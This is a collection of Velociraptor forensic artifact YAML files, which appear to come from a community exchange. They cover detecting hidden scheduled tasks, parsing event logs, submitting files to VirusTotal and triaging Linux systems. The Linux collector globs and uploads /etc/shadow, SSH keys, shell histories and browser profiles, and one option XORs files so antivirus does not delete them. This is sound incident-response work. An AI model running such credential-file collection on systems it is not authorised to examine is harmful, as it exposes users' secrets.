        AND NOT SourceIP =~ '''^192\.88\.99\.''' -- Internet relay
        AND NOT SourceIP =~ '''^192\.168\.''' -- Private network
        AND NOT SourceIP =~ '''^198\.1[8-9]\.''' -- Private network
        AND NOT SourceIP =~ '''^198\.51\.100\.''' -- Documentation
        AND NOT SourceIP =~ '''^203\.0\.113\.''' -- Documentation
        AND NOT SourceIP =~ '''^2(2[4-9]|3[0-9])\.''' -- IP multicast
        AND NOT SourceIP =~ '''^233\.252\.''' -- Documentation
        AND NOT SourceIP =~ '''^2(4[0-9]|5[0-5])\.\d{1,3}\.\d{1,3}\.\d{1,2}[0-4]''' -- reserved
        AND NOT SourceIP =~ '''^255\.255\.255\.255$''' -- Broadcast

    notebook:
      - type: vql_suggestion
        name: Public IP
        template: |
            /*
            ### IPublic IP
            Triage view with suggested WHERE Lines
            
            */
            
            SELECT EventTime,Computer,Channel,
                EventID,LogonType,Description,
                DomainName +'/' + UserName as User,
                SourceIP,
                Message	
            FROM source(artifact="Windows.Detection.PublicIP")
            WHERE True
                --AND EventTime > '2022-10'
                --AND EventTime < '2022-12'
                --AND SourceIP =~ '^127\\.|localhost'
                --AND NOT SourceIP =~ '^127\\.|localhost'

---END OF FILE---

======
FILE: /content/exchange/artifacts/Exchange.Server.Enrichment.Gimphash.yaml
======
name: Exchange.Server.Enrichment.Gimphash
description: |
    Calculate the Gimphash for a Golang binary.
    
    See: https://github.com/NextronSystems/gimphash
    
    This artifact can be called from within another artifact (such as one looking for Golang binaries) to enrich the data made available by that artifact.
  
    Ex.
  
    `SELECT * from Artifact.Server.Enrichment.Gimphash(File=$YOURFILE)`
    
    NOTE: You will need to change the tool URL if using Linux as your server OS.
    
author: Wes Lambert -- @therealwlambert
tools:
  - name: Gimphash
    url: https://github.com/NextronSystems/gimphash/releases/download/0.2.0/go_gimphash_windows.exe
parameters:
  - name: File
    type: string
    description: File for which Gimphash is to be calculated
    default:
sources:
  - query: |
        LET GH <= SELECT FullPath FROM Artifact.Generic.Utils.FetchBinary(ToolName="Gimphash", IsExecutable=FALSE)
        LET ExecGH <= SELECT * FROM execve(argv=[
                        GH.FullPath[0], File])
        SELECT grok(grok=("%{DATA:gimphash} %{GREEDYDATA:file}"), data=Stdout).file AS File, grok(grok=("%{DATA:gimphash} %{GREEDYDATA:file}"), data=Stdout).gimphash AS Gimphash FROM ExecGH 

---END OF FILE---

======
FILE: /content/exchange/artifacts/Windows.Registry.TaskCache.HiddenTasks.yaml
======
name: Windows.Registry.TaskCache.HiddenTasks
author: Zach Stanford - @svch0st
description: |
  This artefact will highlight any scheduled tasks missing the Security Descriptor (SD) value in the task cache. Without this value, the task is hidden from common query methods. 
  
  Once a task is identified with the SD value missing, the arefact tries to pull additional information from the registry and XML file for the task. 
  
  An example of this technique is used by the Tarrask malware.
  
  Reference:
    - https://www.microsoft.com/security/blog/2022/04/12/tarrask-malware-uses-scheduled-tasks-for-defense-evasion/
  
precondition: SELECT OS From info() where OS = 'windows'

sources:
  - query: | 
            Select * from foreach(row={ 
                            SELECT *,
                                FROM read_reg_key(globs='HKEY_LOCAL_MACHINE/SOFTWARE/Microsoft/Windows NT/CurrentVersion/Schedule/TaskCache/Tree/**', accessor="reg")
                            Where SD = null
                          },
                      query={
                            SELECT
                                    Date,
                                    Key.FullPath,
                                    Path, 
                                    {SELECT * FROM Artifact.Windows.System.TaskScheduler(TasksPath="C:\\Windows\\System32\\Tasks"+Path)} as TaskXML, 
                                    basename(path=Key.FullPath) as TaskID
                            FROM read_reg_key(globs='HKEY_LOCAL_MACHINE/SOFTWARE/Microsoft/Windows NT/CurrentVersion/Schedule/TaskCache/Tasks/*', accessor="reg")
                            WHERE TaskID = Id
                      })


---END OF FILE---

======
FILE: /content/exchange/artifacts/Server.Enrichment.Virustotal.FileScan.yaml
======
name: Server.Enrichment.Virustotal.FileScan
author: Wes Lambert -- @therealwlambert
description: | 
  Submit a file to Virustotal for analysis.  
  
  This artifact is based on the multipart/form-data example here:
  
  https://docs.velociraptor.app/knowledge_base/tips/multiparts_uploads/
  
  This artifact can be called from within another artifact (such as one looking for files) to enrich the data made available by that artifact.
  
  Ex.
  
    `SELECT * from Artifact.Server.Enrichment.Virustotal.FileScan(FileToScan=$YOURFILE)`
  
  NOTE: The default time to wait for scan results is set to 60 seconds. In the future, this artifact will be optimized to poll for result status instead of using a static wait interval.
  
type: SERVER

parameters:
    - name: FileToScan
      type: string
      description: The file to submit to Virustotal (this refers to the file's actual path on disk).
      default: 
    - name: TimeToWait
      type: int
      description: Time to wait before attempting to pull results for the file submission.
      default: 60
    - name: VirustotalKey
      type: string
      description: API key for Virustotal. Leave blank here if using server metadata store.
      default:

sources:
  - queries:
    - |
        LET Creds = if(
           condition=VirustotalKey,
           then=VirustotalKey,
           else=server_metadata().VirustotalKey)
    - |
        LET Url <= 'https://www.virustotal.com/api/v3/'
        
    - |
        LET Boundary <= "-----------------------------9051914041544843365972754266"
        
    - | 
        LET File(Filename, ParameterName, Data) = format(
            format='--%s\nContent-Disposition: form-data; name="%s"; filename="%v"\nContent-Type: text/plain\n\n%s\n',
            args=[Boundary, ParameterName, Filename, Data])

    - |
        LET END = format(format="--%s--\n", args=Boundary)

    - | 
        LET Submission = SELECT * FROM chain(
            a={SELECT parse_json(data=Content).data.id AS SubmissionId FROM http_client(
                method="POST",
                url=Url + 'files',
                headers=dict(`x-apikey`=Creds, `Content-Type`="multipart/form-data; boundary=" + Boundary),
                data=File(Filename=path_split(path=FileToScan)[1], ParameterName="file", Data=read_file(filename=FileToScan)) + END)},
            b={SELECT sleep(time=TimeToWait) FROM scope()}
        )

    - | 
        LET Analysis = SELECT parse_json(data=Content) AS Content FROM  http_client(
            method="GET",
            url=Url + 'analyses/' + Submission.SubmissionId[0],
            headers=dict(`x-apikey`=Creds))

    - |
        SELECT path_split(path=FileToScan)[1] AS Filename, 
            Content.data.attributes.stats AS Stats, 
            Content.data.attributes.results AS Results, 
            Content.meta.file_info AS _FileInfo, 
            Content AS _Data 
        FROM Analysis

---END OF FILE---

======
FILE: /content/exchange/artifacts/Windows.EventLogs.EvtxHussar.yaml
======
name: Windows.EventLogs.EvtxHussar
description: |
   Grab important events from Windows logs (.evtx) using [EvtxHussar](https://github.com/yarox24/EvtxHussar).
   Also upload PowerShell ScriptBlocks (reconstructed as files).
   
   Following categories are supported:<br />
   - Antivirus (Symantec, Windows Defender)<br />
   - Accounts (Users related operations)<br />
   - Audit (Log cleared, Policy changed)<br />
   - Windows Firewall <br />
   - Logons<br />
   - Powershell events<br />
   - Processes<br />
   - RDP<br />
   - ScheduledTasks (creation/modification/execution)<br />
   - Services<br />
   - WinRM<br />
   - Boot up/Restart/Shutdown<br />
   - SMB
   
   Note: If no logs from specific category will be found, source will remain empty.<br />
   Based on version 1.7 of EvtxHussar. 
   
author: Jarosław Oparka - @yarox24

type: CLIENT

resources:
  timeout: 3600 # 1 hour
  max_rows: 10000000 # 10 million
  max_upload_bytes: 5368709120 # 5 Gigabytes

tools:
  - name: EvtxHussar17
    url: https://github.com/yarox24/EvtxHussar/releases/download/1.7/EvtxHussar1.7_windows_amd64.zip
    serve_locally: true

precondition:
      SELECT OS From info() where OS = 'windows' AND Architecture = "amd64"
  
parameters:
  - name: LogsPath
    description: |
      Windows Event logs path
    default: "C:\\Windows\\System32\\winevt\\Logs"
    type: hidden
  - name: AntivirusSymantec
    description: |
      Include Symantec Network Protection (Application.evtx) events
    default: Y
    type: bool
  - name: AntivirusWindowsDefender
    description: |
      Include Windows Defender (Microsoft-Windows-Windows Defender%4Operational.evtx) events
    default: Y
    type: bool
  - name: AccountsUserRelatedOperations
    description: |
      Include events related to account manipulation (Security.evtx)
    default: Y
    type: bool
  - name: AuditLogCleared
    description: |
      Include events related to Windows Event log clearing (Security.evtx, System.evtx)
    default: Y
    type: bool
  - name: AuditPolicyChanges
    description: |
      Include events related to changes in audit policy (Security.evtx)
    default: Y
    type: bool
  - name: BootupRestartShutdown
    description: |
      Include events related to boot up/restart/shutdown of OS (System.evtx, Security.evtx)
    default: Y
    type: bool
  - name: Logons
    description: |
      Include events related to logon/logoff/sessions of Windows users (Security.evtx)
    default: Y
    type: bool
  - name: PowerShellScriptBlocksReconstructAndUpload
    description: |
      Include EID 4104 - Creating Scriptblock text (Microsoft-Windows-PowerShell%4Operational.evtx), reconstruct and upload them as .ps1 files
    default: Y
    type: bool
  - name: Option_PowerShellScriptBlocksXorApply
    description: |
      Should we apply XOR operation (Key: Y) on reconstructed PS ScriptBlocks when saving them temporarily on target system. May prevent them from deletion by AV.
    default: Y
    type: bool
  - name: PowerShellEvents
    description: |
      Include events related to PowerShell activity on the system (Microsoft-Windows-PowerShell%4Operational.evtx, Windows PowerShell.evtx)
    default: Y
    type: bool
  - name: Processes
    description: |
      Include events related to creation/termination of processess (Security.evtx, Microsoft-Windows-Sysmon%4Operational.evtxx)
    default: Y
    type: bool
  - name: RDP
    description: |
      Include events related to RDP activity on the system (Microsoft-Windows-RemoteDesktopServices-RdpCoreTS%4Operational.evtx, Security.evtx, Microsoft-Windows-TerminalServices-LocalSessionManager%4Operational.evtx, Microsoft-Windows-TerminalServices-RDPClient%254Operational.evtx, Microsoft-Windows-TerminalServices-RemoteConnectionManager%4Operational.evtx)
    default: Y
    type: bool
  - name: ScheduledTasksCreationModification
    description: |
      Include events related to creation and modification of Scheduled Tasks (Microsoft-Windows-TaskScheduler%4Operational.evtx, Security.evtx)
    default: Y
    type: bool
  - name: ScheduledTasksExecution
    description: |
      Include events related to execution of Scheduled Tasks(Microsoft-Windows-TaskScheduler%4Operational.evtx)
    default: Y
    type: bool
  - name: Services
    description: |
      Include events related to Windows services (System.evtx, Security.evtx)
    default: Y
    type: bool
  - name: SMBClientDestinations
    description: |
      Include events related to usage of SMB Client (outgoing SMB connections)
    default: Y
    type: bool
  - name: SMBServerAccessAudit
    description: |
      Include events related to access to SMB Server (incoming SMB connections)
    default: Y
    type: bool
  - name: SMBServerModifications
    description: |
      Include events related to SMB Server configuration
    default: Y
    type: bool
  - name: WindowsFirewall
    description: |
      Include Windows Firewall (Microsoft-Windows-Windows Firewall With Advanced Security%4Firewall.evtx, Security.evtx) events
    default: Y
    type: bool
  - name: WinRM
    description: |
      Include events related to Windows Remote Management (Microsoft-Windows-WinRM%4Operational.evtx)
    default: Y
    type: bool


sources:
  - name: Antivirus_Symantec
    query: |
      // Execute EvtxHussar
      LET ZipInfo <= SELECT FullPath FROM Artifact.Generic.Utils.FetchBinary(ToolName= "EvtxHussar17", IsExecutable= False)
      
      LET tmpdir <= tempdir()
      
      LET Unpack <= SELECT * FROM unzip(filename=ZipInfo[0].FullPath, output_directory=tmpdir)
      
      LET Binpath <= tmpdir + "\\EvtxHussar\\EvtxHussar.exe"
      LET CWDpath <= tmpdir + "\\EvtxHussar\\"
      
      LET outdir <= tempdir()
      
      LET cnt <= int(int=0)
      LET IncreaseCounter(c, cat_flag) = if(condition= cat_flag = "Y", then=c + 1, else=c)
      
      LET cnt <= IncreaseCounter(c=cnt, cat_flag=AntivirusSymantec)
      LET cnt <= IncreaseCounter(c=cnt, cat_flag=AntivirusWindowsDefender)
      LET cnt <= IncreaseCounter(c=cnt, cat_flag=AccountsUserRelatedOperations)
      LET cnt <= IncreaseCounter(c=cnt, cat_flag=AuditLogCleared)
      LET cnt <= IncreaseCounter(c=cnt, cat_flag=AuditPolicyChanges)
      LET cnt <= IncreaseCounter(c=cnt, cat_flag=BootupRestartShutdown)
      LET cnt <= IncreaseCounter(c=cnt, cat_flag=Logons)
      LET cnt <= IncreaseCounter(c=cnt, cat_flag=PowerShellScriptBlocksReconstructAndUpload)
      LET cnt <= IncreaseCounter(c=cnt, cat_flag=PowerShellEvents)
      LET cnt <= IncreaseCounter(c=cnt, cat_flag=Processes)
      LET cnt <= IncreaseCounter(c=cnt, cat_flag=RDP)
      LET cnt <= IncreaseCounter(c=cnt, cat_flag=ScheduledTasksCreationModification)
      LET cnt <= IncreaseCounter(c=cnt, cat_flag=ScheduledTasksExecution)
      LET cnt <= IncreaseCounter(c=cnt, cat_flag=Services)
      LET cnt <= IncreaseCounter(c=cnt, cat_flag=SMBClientDestinations)
      LET cnt <= IncreaseCounter(c=cnt, cat_flag=SMBServerAccessAudit)
      LET cnt <= IncreaseCounter(c=cnt, cat_flag=SMBServerModifications)
      LET cnt <= IncreaseCounter(c=cnt, cat_flag=WinRM)
      LET cnt <= IncreaseCounter(c=cnt, cat_flag=WindowsFirewall)
      LET cnt_max <= int(int=19)
      
      
      LET AppendIfEnabled(arr, cat_flag, l2propername) = if(condition= cat_flag = "Y", then= arr + l2propername, else= arr )
      
      LET EnabledL2Maps <= array(a="TO_DELETE")
      LET EnabledL2Maps <= AppendIfEnabled(arr=EnabledL2Maps, cat_flag=AntivirusSymantec, l2propername="AV_SymantecNetwork")
      LET EnabledL2Maps <= AppendIfEnabled(arr=EnabledL2Maps, cat_flag=AntivirusWindowsDefender, l2propername="AV_WindowsDefender")
      LET EnabledL2Maps <= AppendIfEnabled(arr=EnabledL2Maps, cat_flag=AccountsUserRelatedOperations, l2propername="AccountsUserRelatedOperations")
      LET EnabledL2Maps <= AppendIfEnabled(arr=EnabledL2Maps, cat_flag=AuditLogCleared, l2propername="AuditLogCleared")
      LET EnabledL2Maps <= AppendIfEnabled(arr=EnabledL2Maps, cat_flag=AuditPolicyChanges, l2propername="AuditPolicyChanged")
      LET EnabledL2Maps <= AppendIfEnabled(arr=EnabledL2Maps, cat_flag=BootupRestartShutdown, l2propername="General_BootupRestartShutdown")
      LET EnabledL2Maps <= AppendIfEnabled(arr=EnabledL2Maps, cat_flag=Logons, l2propername="LogonsUniversal")
      LET EnabledL2Maps <= AppendIfEnabled(arr=EnabledL2Maps, cat_flag=PowerShellScriptBlocksReconstructAndUpload, l2propername="PowerShellScriptBlock")
      LET EnabledL2Maps <= AppendIfEnabled(arr=EnabledL2Maps, cat_flag=PowerShellEvents, l2propername="PowerShellUniversal")
      LET EnabledL2Maps <= AppendIfEnabled(arr=EnabledL2Maps, cat_flag=Processes, l2propername="ProcessCreation")
      LET EnabledL2Maps <= AppendIfEnabled(arr=EnabledL2Maps, cat_flag=RDP, l2propername="RDPUniversal")
      LET EnabledL2Maps <= AppendIfEnabled(arr=EnabledL2Maps, cat_flag=ScheduledTasksCreationModification, l2propername="ScheduledTasks_CreationModification")
      LET EnabledL2Maps <= AppendIfEnabled(arr=EnabledL2Maps, cat_flag=ScheduledTasksExecution, l2propername="ScheduledTasks_Execution")
      LET EnabledL2Maps <= AppendIfEnabled(arr=EnabledL2Maps, cat_flag=Services, l2propername="ServicesUniversal")
      LET EnabledL2Maps <= AppendIfEnabled(arr=EnabledL2Maps, cat_flag=SMBClientDestinations, l2propername="SMB_ClientDestinations")
      LET EnabledL2Maps <= AppendIfEnabled(arr=EnabledL2Maps, cat_flag=SMBServerAccessAudit, l2propername="SMB_ServerAccessAudit")
      LET EnabledL2Maps <= AppendIfEnabled(arr=EnabledL2Maps, cat_flag=SMBServerModifications, l2propername="SMB_ServerModifications")
      LET EnabledL2Maps <= AppendIfEnabled(arr=EnabledL2Maps, cat_flag=WinRM, l2propername="WinRMUniversal")
      LET EnabledL2Maps <= AppendIfEnabled(arr=EnabledL2Maps, cat_flag=WindowsFirewall, l2propername="FirewallUniversal")
      
      
      LET HussArgs <= array(bin=Binpath, 
                      outdir_flag="-o", 
                      outdir_path=outdir, 
                      format_flag="-f", 
                      format_val="jsonl"
                      )
      LET HussArgs <= if(condition= cnt < cnt_max, then= HussArgs + "--includeonly" + join(array=EnabledL2Maps[1:], sep=","), else= HussArgs)
      LET HussArgs <= if(condition= Option_PowerShellScriptBlocksXorApply = "Y", then= HussArgs + "--scriptblockxor", else= HussArgs)
      LET HussArgs <= HussArgs + LogsPath
      
      LET _ <= log(message="EvtxHussar cmdline arguments: %v", arguments=HussArgs)
      
      LET ExecuteHussar = SELECT log(message="EvtxHussar stdout: %s", args=[Stdout]) FROM execve(cwd=CWDpath, argv=HussArgs, sep="\n")
      
      LET _ <= if(condition= cnt > 0, then= ExecuteHussar, else= log(message="As no plugins were selected, nothing to do."))
      
      
      // Helper functions for sources
      LET GetOutputFiles(category, jsonl_filename) = SELECT OSPath, Size FROM glob(globs=outdir + format(format="\\*\\%s\\%s", args=[category, jsonl_filename]))
      
      LET PluginOutput(search_result) = SELECT * FROM foreach(
         row= { SELECT * FROM search_result },
         query= { SELECT * FROM parse_jsonl(filename=OSPath) ORDER BY EventTime DESC}
      )
      
      // Antivirus_Symantec
      SELECT *, "EvtxHussar.Antivirus_Symantec" AS __Source FROM PluginOutput(search_result=GetOutputFiles(category="av", jsonl_filename="symantec_networkprotection.jsonl"))
      
  - name: Antivirus_WindowsDefender
    query: |
      SELECT *, "EvtxHussar.Antivirus_WindowsDefender" AS __Source FROM PluginOutput(search_result=GetOutputFiles(category="av", jsonl_filename="windows_defender.jsonl"))

  - name: Accounts_UsersRelatedOperations
    query: |
      SELECT *, "EvtxHussar.Accounts_UsersRelatedOperations" AS __Source FROM PluginOutput(search_result=GetOutputFiles(category="accounts", jsonl_filename="users_related_operations.jsonl"))

  - name: Audit_LogCleared
    query: |
      SELECT *, "EvtxHussar.Audit_LogCleared" AS __Source FROM PluginOutput(search_result=GetOutputFiles(category="audit", jsonl_filename="log_cleared.jsonl"))

  - name: Audit_PolicyChanges
    query: |
      SELECT *, "EvtxHussar.Audit_PolicyChanges" AS __Source FROM PluginOutput(search_result=GetOutputFiles(category="audit", jsonl_filename="policy_change.jsonl"))

  - name: BootupRestartShutdown
    query: |
      SELECT *, "EvtxHussar.BootupRestartShutdown" AS __Source FROM PluginOutput(search_result=GetOutputFiles(category="general", jsonl_filename="bootup_restart_shutdown.jsonl"))
      
  - name: Logons
    query: |
      SELECT *, "EvtxHussar.Logons" AS __Source FROM PluginOutput(search_result=GetOutputFiles(category="logons", jsonl_filename="logons.jsonl"))
      
  - name: Powershell_Events
    query: |
      SELECT *, "EvtxHussar.Powershell_Events" AS __Source FROM PluginOutput(search_result=GetOutputFiles(category="powershell", jsonl_filename="powershell_events.jsonl"))

  - name: Powershell_ScriptblocksSummary
    query: |
      SELECT *, "EvtxHussar.Powershell_ScriptblocksSummary" AS __Source FROM foreach(
      row= { SELECT *, if(condition= Option_PowerShellScriptBlocksXorApply = "Y", then= Name[:-4], else=Name) AS FinalName, if(condition= Option_PowerShellScriptBlocksXorApply = "Y", then = xor(string=read_file(filename=OSPath), key='Y'), else = read_file(filename=OSPath)) AS Content FROM glob(globs=outdir + "\\*\\powershell\\scriptblocks\\*") },
      query= { SELECT FinalName, upload(file=Content, accessor="data", name="C:\\evtxhussar_virtual_scriptblocks_directory\\" + FinalName).sha256 AS UploadSHA256, Size, humanize(bytes=Size) AS `Human Size`, Content[:100]  AS `First 100 characters of script` FROM scope() }
      )

  - name: Processes
    query: |
      SELECT *, "EvtxHussar.Processes" AS __Source FROM PluginOutput(search_result=GetOutputFiles(category="processes", jsonl_filename="processes.jsonl"))
      
  - name: RDP
    query: |
      SELECT *, "EvtxHussar.RDP" AS __Source FROM PluginOutput(search_result=GetOutputFiles(category="rdp", jsonl_filename="rdp.jsonl"))
      
  - name: ScheduledTasks_CreationModification
    query: |
      SELECT *, "EvtxHussar.ScheduledTasks_CreationModification" AS __Source FROM PluginOutput(search_result=GetOutputFiles(category="scheduled_tasks", jsonl_filename="creation_modification.jsonl"))
      
  - name: ScheduledTasks_Execution
    query: |
      SELECT *, "EvtxHussar.ScheduledTasks_Execution" AS __Source FROM PluginOutput(search_result=GetOutputFiles(category="scheduled_tasks", jsonl_filename="execution.jsonl"))
      
  - name: Services
    query: |
      SELECT *, "EvtxHussar.Services" AS __Source FROM PluginOutput(search_result=GetOutputFiles(category="services", jsonl_filename="services.jsonl"))

  - name: SMB_ClientDestinations
    query: |
      SELECT *, "EvtxHussar.SMB_ClientDestinations" AS __Source FROM PluginOutput(search_result=GetOutputFiles(category="smb", jsonl_filename="smb_client_destinations.jsonl"))

  - name: SMB_ServerAccessAudit
    query: |
      SELECT *, "EvtxHussar.SMB_ServerAccessAudit" AS __Source FROM PluginOutput(search_result=GetOutputFiles(category="smb", jsonl_filename="smb_server_access_audit.jsonl"))
      
  - name: SMB_ServerModifications
    query: |
      SELECT *, "EvtxHussar.SMB_ServerModifications" AS __Source FROM PluginOutput(search_result=GetOutputFiles(category="smb", jsonl_filename="smb_server_modifications.jsonl"))

  - name: WinRM
    query: |
      SELECT *, "EvtxHussar.WinRM" AS __Source FROM PluginOutput(search_result=GetOutputFiles(category="winrm", jsonl_filename="winrm.jsonl"))
      
  - name: WindowsFirewall
    query: |
      SELECT *, "EvtxHussar.WindowsFirewall" AS __Source FROM PluginOutput(search_result=GetOutputFiles(category="firewall", jsonl_filename="windows_firewall.jsonl"))
      

---END OF FILE---

======
FILE: /content/exchange/artifacts/Linux.Forensics.Targets.yaml
======
name: Linux.Forensics.Targets
author: Cedric MAURUGEON - @kidrek
description: |
  This artifact collects all necessary artifacts files and directories from Linux operating system. 
  
reference:
  - https://github.com/ForensicArtifacts/artifacts/blob/main/artifacts/data/linux.yaml

parameters:
  - name: BootTargets
    type: csv
    default: |
      Glob
      /boot/grub/grub.cfg
      /boot/grub2/grub.cfg
      /boot/initramfs*
      /boot/initrd*
      /etc/init.d/**
      /etc/insserv.conf
      /etc/insserv.conf.d/**

  - name: CertificateTargets
    type: csv
    default: |
      Glob
      /etc/ca-certificates.conf
      /etc/ssl/certs/ca-certificates.crt
      /usr/share/ca-certificates/**
      /usr/local/share/ca-certificates/**

  - name: CronTargets
    type: csv
    default: |
      Glob
      /etc/anacrontab
      /etc/at.allow
      /etc/at.deny
      /etc/cron.allow
      /etc/cron.d/**
      /etc/cron.daily/**
      /etc/cron.deny
      /etc/cron.hourly/**
      /etc/cron.monthly/**
      /etc/cron.weekly/**
      /etc/crontab
      /var/at/tabs/**
      /var/spool/anacron/cron.*
      /var/spool/at/**
      /var/spool/cron/**

  - name: LogTargets
    type: csv
    default: |
      Glob
      /etc/rsyslog.conf
      /etc/rsyslog.d/**
      /var/log/apache2/**
      /var/log/apt/history.log*
      /var/log/apt/term.log*
      /var/log/auth*
      /var/log/cron.log*
      /var/log/daemon*
      /var/log/journal/**
      /var/log/kern*
      /var/log/lastlog
      /var/log/mail*
      /var/log/messages*
      /var/log/secure*
      /var/log/syslog*
      /var/log/nginx/**
      /var/log/ufw.log*

  - name: NetworkTargets
    type: csv
    default: |
      Glob
      /etc/netplan/*.yaml
      /etc/network/if-up.d/**
      /etc/network/if-down.d/**
      /etc/network/interfaces
      /etc/resolv.conf
      /etc/default/ufw
      /etc/ufw/sysctl.conf
      /etc/ufw/*.rules
      /etc/ufw/applications.d/**

  - name: PackageTargets
    type: csv
    default: |
      Glob
      /etc/apt/sources.list
      /etc/apt/sources.list.d/*
      /etc/apt/trusted.gpg
      /etc/apt/trusted.gpg.d/*
      /etc/apt/trustdb.gpg
      /etc/yum.conf
      /etc/yum.repos.d/*.repo
      /usr/share/keyrings/*
      /var/lib/dpkg/status

  - name: ServiceTargets
    type: csv
    default: |
      Glob
      /etc/systemd/system.control/*.timer
      /etc/systemd/systemd.attached/*.timer
      /etc/systemd/system/*.timer
      /etc/systemd/user/*.timer
      /lib/systemd/system/*.timer
      /lib/systemd/user/*.timer
      /run/systemd/generator.early/*.timer
      /run/systemd/generator.late/*.timer
      /run/systemd/generator/*.timer
      /run/systemd/system.control/*.timer
      /run/systemd/systemd.attached/*.timer
      /run/systemd/system/*.timer
      /run/systemd/transient/*.timer
      /run/systemd/user/*.timer
      /run/user/*/systemd/generator.early/*.timer
      /run/user/*/systemd/generator.late/*.timer
      /run/user/*/systemd/generator/*.timer
      /run/user/*/systemd/transient/*.timer
      /run/user/*/systemd/user.control/*.timer
      /run/user/*/systemd/user/*.timer
      /usr/lib/systemd/system/*.timer
      /usr/lib/systemd/user/*.timer
      /home/*/.config/systemd/user.control/*.timer
      /home/*/.config/systemd/user/*.timer
      /home/*/.local/share/systemd/user/*.timer
      /root/.config/systemd/user.control/*.timer
      /root/.config/systemd/user/*.timer
      /root/.local/share/systemd/user/*.timer
      /etc/systemd/system.control/*.service
      /etc/systemd/systemd.attached/*.service
      /etc/systemd/system/*.service
      /etc/systemd/user/*.service
      /lib/systemd/system/*.service
      /lib/systemd/user/*.service
      /run/systemd/generator.early/*.service
      /run/systemd/generator.late/*.service
      /run/systemd/generator/*.service
      /run/systemd/system.control/*.service
      /run/systemd/systemd.attached/*.service
      /run/systemd/system/*.service
      /run/systemd/transient/*.service
      /run/systemd/user/*.service
      /run/user/*/systemd/generator.early/*.service
      /run/user/*/systemd/generator.late/*.service
      /run/user/*/systemd/generator/*.service
      /run/user/*/systemd/transient/*.service
      /run/user/*/systemd/user.control/*.service
      /run/user/*/systemd/user/*.service
      /usr/lib/systemd/system/*.service
      /usr/lib/systemd/user/*.service
      /home/*/.config/systemd/user.control/*.service
      /home/*/.config/systemd/user/*.service
      /home/*/.local/share/systemd/user/*.service
      /root/.config/systemd/user.control/*.service
      /root/.config/systemd/user/*.service
      /root/.local/share/systemd/user/*.service


  - name: SystemTargets
    type: csv
    default: |
      Glob
      /dev/shm/**
      /etc/fstab
      /etc/hostname
      /etc/issue
      /etc/issue.net
      /etc/ld.so.preload
      /etc/localtime
      /etc/ntp.conf
      /etc/modprobe.d/*
      /etc/modules.conf
      /etc/ssh/**
      /etc/timezone
      /etc/udev/rules.d/*
      /usr/lib/udev/rules.d/*

  - name: SystemVersionTargets
    type: csv
    default: |
      Glob
      /etc/debian_version
      /etc/centos-release
      /etc/enterprise-release
      /etc/oracle-release
      /etc/redhat-release
      /etc/rocky-release
      /etc/SuSE-release
      /etc/system-release
      /etc/lsb-release
      /etc/os-release
      /usr/lib/os-release

  - name: UserTargets
    type: csv
    default: |
      Glob
      /etc/passwd
      /etc/shadow
      /etc/sudoers
      /etc/sudoers.d/**
      /etc/group
      /home/*/.config/mozilla/**
      /home/*/snap/firefox/common/.mozilla/**
      /home/*/.config/google-chrome/**
      /home/*/snap/chromium/common/chromium/Default/**
      /home/*/.aliases
      /home/*/.profile
      /home/*/.*_history
      /home/*/.*rc
      /home/*/.ssh/*
      /home/*/.wget-hsts
      /root/.config/mozilla/**
      /root/snap/firefox/common/.mozilla/**
      /root/.config/google-chrome/**
      /root/snap/chromium/common/chromium/Default/**
      /root/.aliases
      /root/.profile
      /root/.*_history
      /root/.*rc
      /root/.ssh/*
      /root/.wget-hsts

precondition: SELECT OS From info() where OS = 'linux'

sources:
  - name: BootTargets
    query: |
      SELECT OSPath, upload(file=OSPath) AS Upload
      FROM glob(globs=BootTargets.Glob)

  - name: CertificateTargets
    query: |
      SELECT OSPath, upload(file=OSPath) AS Upload
      FROM glob(globs=CertificateTargets.Glob)

  - name: CronTargets
    query: |
      SELECT OSPath, upload(file=OSPath) AS Upload
      FROM glob(globs=CronTargets.Glob)

  - name: LogTargets
    query: |
      SELECT OSPath, upload(file=OSPath) AS Upload
      FROM glob(globs=LogTargets.Glob)

  - name: NetworkTargets
    query: |
      SELECT OSPath, upload(file=OSPath) AS Upload
      FROM glob(globs=NetworkTargets.Glob)

  - name: PackageTargets
    query: |
      SELECT OSPath, upload(file=OSPath) AS Upload
      FROM glob(globs=PackageTargets.Glob)

  - name: ServiceTargets
    query: |
      SELECT OSPath, upload(file=OSPath) AS Upload
      FROM glob(globs=ServiceTargets.Glob)

  - name: SystemTargets
    query: |
      SELECT OSPath, upload(file=OSPath) AS Upload
      FROM glob(globs=SystemTargets.Glob)

  - name: SystemVersionTargets
    query: |
      SELECT OSPath, upload(file=OSPath) AS Upload
      FROM glob(globs=SystemVersionTargets.Glob)

  - name: UserTargets
    query: |
      SELECT OSPath, upload(file=OSPath) AS Upload
      FROM glob(globs=UserTargets.Glob)

---END OF FILE---

======
FILE: /content/exchange/artifacts/hash_run_keys.yaml
======
name: HashRunKeys
description: |
    Iterate over all the run keys and locate their binary then hash it.

    Tags: #windows #registry #detection

parameters:
  - name: runKeys
    default: |
      HKEY_USERS\*\Software\Microsoft\Windows\CurrentVersion\Run\*

  - name: pathRegex
    type: hidden

    # Pick the first part - either quoted or not.
    default: >-
      (^"(?P<quoted_path>[^"]+)"|(?P<unquoted_path>^[^ ]+))

sources:
  - precondition:
      SELECT OS From info() where OS = 'windows'
    query: |
      LET paths = SELECT FullPath,Name, Data.value AS Value,
               parse_string_with_regex(string=Data.value,
                                       regex=pathRegex) as regData
      FROM glob(globs=split(string=runKeys, sep="[, \\n]+"),
                accessor="reg")
      WHERE Data.value

      -- Handle some variations we see in the value:
      -- system32\drivers\XXX.sys -> %systemRoot%\System32\
      -- \SystemRoot\ -> %SystemRoot%\
      LET normalized = SELECT *,
           expand(path=
              regex_replace(re='(?i)^system32\\\\',
                            replace="%SystemRoot%\\system32\\",
              source=regex_replace(
                  source=regData.quoted_path + regData.unquoted_path,
                  re="^\\\\SystemRoot\\\\",
                  replace="%SystemRoot%\\"))) AS RealPath
      FROM paths

      SELECT FullPath, Name, Value, RealPath,
               hash(path=expand(path=RealPath)).SHA256 AS Hash
      FROM normalized

---END OF FILE---

======
FILE: /content/exchange/artifacts/Linux.Detection.vRealizeLogInsightExploitation.yaml
======
name: Linux.Detection.vRealizeLogInsightExploitation
author: ACEResponder.com
description: |
   Checks for exploitation of vRealize Log Insight VMSA-2023-0001 exploitation 
   artifacts. The presence of a path traversal in the FileName field
   is evidence of compromise. There is still a path to exploitation without
   leveraging the path traversal vuln. Any attempt to run
   REMOTE_PAK_DOWNLOAD_COMMAND from a non-vRealize server is malicious.
   #VMWare #vRealize #exploit

